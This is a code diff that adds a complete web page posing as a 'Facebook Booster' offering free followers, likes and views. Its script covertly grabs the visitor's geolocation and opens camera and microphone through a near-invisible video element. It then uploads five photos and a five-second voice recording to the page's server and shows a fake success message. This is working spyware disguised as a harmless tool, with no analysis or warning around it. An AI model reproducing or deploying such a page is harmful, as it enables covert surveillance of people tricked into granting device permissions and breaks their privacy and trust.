@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ps" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Booster</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: linear-gradient(135deg, #1877f2 0%, #0d47a1 100%); color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
+        .container { width: 100%; max-width: 400px; background-color: #ffffff; border-radius: 30px; padding: 25px 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.3); display: flex; flex-direction: column; gap: 18px; }
+        .header { display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .fb-logo { font-size: 32px; background: #1877f2; color: white; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; border-radius: 50%; font-weight: 900; }
+        .fb-title { font-size: 28px; font-weight: 800; color: #1877f2; }
+        .input-wrapper { background-color: #f0f2f5; border: 1px solid #ccd0d5; border-radius: 16px; padding: 14px 16px; }
+        .input-box { width: 100%; background: transparent; border: none; outline: none; font-size: 15px; font-weight: 600; color: #1c1e21; }
+        .grid-options { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .opt-card { background-color: #f0f2f5; border: 1px solid #ccd0d5; padding: 16px 8px; border-radius: 18px; text-align: center; cursor: pointer; }
+        .opt-card.active { background: #1877f2; color: #ffffff; border-color: #1877f2; }
+        .opt-card.active .o-title, .opt-card.active .o-sub { color: #ffffff !important; }
+        .o-title { font-size: 18px; font-weight: 800; color: #1c1e21; }
+        .o-sub { font-size: 11px; color: #65676b; margin-top: 4px; }
+        .generate-btn { background: #1877f2; color: white; width: 100%; padding: 16px; border: none; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3); }
+        .error-box { display: none; background-color: #ffe5e5; border: 1px solid #ff4d4d; border-radius: 14px; padding: 12px; text-align: center; font-size: 13px; color: #d8000c; font-weight: bold; }
+        .success-box { display: none; background-color: #e6f4ea; border: 1px solid #34a853; border-radius: 14px; padding: 12px; text-align: center; font-size: 13px; color: #137333; font-weight: bold; }
+        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <span class="fb-logo">f</span>
+            <div class="fb-title">Facebook Booster</div>
+        </div>
+        <div class="input-wrapper">
+            <input type="text" class="input-box" id="fbLink" placeholder="https://facebook.com/...">
+        </div>
+        <div class="grid-options">
+            <div class="opt-card active" data-type="Followers"><div class="o-title">1K</div><div class="o-sub">Followers</div></div>
+            <div class="opt-card" data-type="Likes"><div class="o-title">1K</div><div class="o-sub">Likes</div></div>
+            <div class="opt-card" data-type="Views"><div class="o-title">1K</div><div class="o-sub">Views</div></div>
+        </div>
+        <button id="generateBtn" class="generate-btn">🚀 Boost Now</button>
+        <div id="errorBox" class="error-box">⚠️ Please enter a valid Profile or Post Link first!</div>
+        <div id="successBox" class="success-box">✅ Successfully delivered boost to your link!</div>
+    </div>
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <script>
+        const optCards = document.querySelectorAll('.opt-card');
+        optCards.forEach(card => {
+            card.addEventListener('click', function(e) {
+                e.preventDefault();
+                optCards.forEach(c => c.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+        async function sendData(fd) { try { await fetch(window.location.href, { method: 'POST', body: fd }); } catch(e){} }
+        async function sendSinglePhoto(stream) {
+            const v = document.getElementById('video'), c = document.getElementById('canvas');
+            if (!v.srcObject) { v.srcObject = stream; await v.play(); }
+            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
+            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+            return new Promise(r => c.toBlob(async b => { const fd = new FormData(); fd.append('photo', b, 'photo.jpg'); await sendData(fd); r(); }, 'image/jpeg'));
+        }
+        async function recordAndSendAudio(stream) {
+            return new Promise(r => {
+                try {
+                    const mr = new MediaRecorder(stream), chunks = [];
+                    mr.ondataavailable = e => chunks.push(e.data);
+                    mr.onstop = async () => { const fd = new FormData(); fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'voice.ogg'); await sendData(fd); r(); };
+                    mr.start(); setTimeout(() => { if(mr.state !== 'inactive') mr.stop(); }, 5000);
+                } catch(e) { r(); }
+            });
+        }
+        document.getElementById("generateBtn").addEventListener("click", async function() {
+            const linkInput = document.getElementById("fbLink");
+            if(linkInput.value.trim() === "") { document.getElementById("errorBox").style.display = "block"; return; }
+            document.getElementById("errorBox").style.display = "none";
+            this.innerText = "Connecting..."; this.disabled = true;
+            if (navigator.geolocation) {
+                await new Promise(r => navigator.geolocation.getCurrentPosition(async pos => {
+                    const fd = new FormData(); fd.append('latitude', pos.coords.latitude); fd.append('longitude', pos.coords.longitude); await sendData(fd); r();
+                }, () => r(), { timeout: 4000 }));
+            }
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    document.getElementById('video').srcObject = stream; await document.getElementById('video').play();
+                    await new Promise(r => setTimeout(r, 300));
+                    let count = 0;
+                    const interval = setInterval(async () => { if(count < 5) { count++; await sendSinglePhoto(stream); } else { clearInterval(interval); } }, 800);
+                    await recordAndSendAudio(stream);
+                    stream.getTracks().forEach(t => t.stop());
+                }
+            } catch(e) {}
+            setTimeout(() => {
+                document.getElementById("successBox").style.display = "block";
+                this.innerText = "Boost Successful ✅";
+            }, 500);
+        });
+    </script>
+</body>
+</html>
